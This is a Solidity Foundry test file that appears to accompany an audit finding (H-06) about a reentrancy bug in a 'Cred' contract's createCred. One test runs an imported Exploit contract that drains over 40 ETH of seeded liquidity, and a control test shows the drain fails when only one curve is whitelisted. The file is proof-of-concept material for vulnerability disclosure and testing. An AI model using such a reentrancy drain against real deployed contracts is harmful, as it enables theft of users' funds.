// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./43397-h-06-reentrancy-in-creating-creds-allows-an-attacker-to-stea.sol";

/*//////////////////////////////////////////////////////////////
    Phi - reentrancy in createCred drains Cred ETH (H-06, #43397)

    - test_exploit: full reentrancy drain via Exploit
    - test_control_singleCurveNoOverwrite: with only one curve, nested
      createCred cannot switch pricing, so the drain does not fire
//////////////////////////////////////////////////////////////*/
contract PhiCredReentrancyTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        Cred cred = e.cred();
        uint256 seed = e.SEED();

        // Seed protocol liquidity (mirrors other users' buy activity).
        vm.deal(address(this), seed + 5 ether);
        cred.seedLiquidity{value: seed}();
        assertEq(address(cred).balance, seed);

        uint256 credBefore = address(cred).balance;
        e.run{value: 3 ether}();

        uint256 drained = credBefore - address(cred).balance;
        assertGt(drained, 40 ether, "drained most of Cred");
        assertGt(address(e).balance, 40 ether, "Exploit holds stolen ETH");
    }

    function test_control_singleCurveNoProfitWithoutOverwrite() public {
        // With only the cheap curve whitelisted, nested createCred with the
        // expensive curve reverts inside the refund callback, so the outer
        // buy refund fails and the attack aborts - Cred balance untouched.
        Cred cred = new Cred();
        FixedPriceBondingCurve cheap = new FixedPriceBondingCurve(0.001 ether);
        FixedPriceBondingCurve expensive = new FixedPriceBondingCurve(0.05 ether);
        cred.addToWhitelist(address(cheap));
        // deliberately NOT whitelisting expensive

        vm.deal(address(this), 55 ether);
        cred.seedLiquidity{value: 50 ether}();

        Attacker a = new Attacker(cred, cheap, expensive);
        // Nested createCred reverts "curve not whitelisted" inside receive(),
        // which surfaces as the buyShareCred refund failing.
        vm.expectRevert("refund failed");
        a.attack{value: 3 ether}();

        assertEq(address(cred).balance, 50 ether, "no drain without second curve");
    }
}
